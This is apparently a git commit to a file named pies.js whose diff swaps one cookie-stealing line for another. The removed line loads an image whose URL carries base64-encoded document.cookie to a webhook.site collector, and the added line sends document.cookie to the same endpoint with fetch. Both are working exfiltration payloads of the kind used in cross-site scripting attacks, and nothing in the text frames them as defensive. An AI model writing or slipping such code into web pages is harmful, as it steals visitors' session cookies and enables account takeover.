d57f775fd21e7d68d58aeb96552fd80535e82d24
stallag295 <jakub.mista4@gmail.com>
2026-02-08 17:25:19 +0100

    Replace image loading with fetch for cookie data

--- pies.js
+++ pies.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/0e20b9c3-d07d-4653-822b-7d92eaa7ce42?data='+btoa(document.cookie);
+fetch('https://webhook.site/0e20b9c3-d07d-4653-822b-7d92eaa7ce42?data=' + document.cookie);
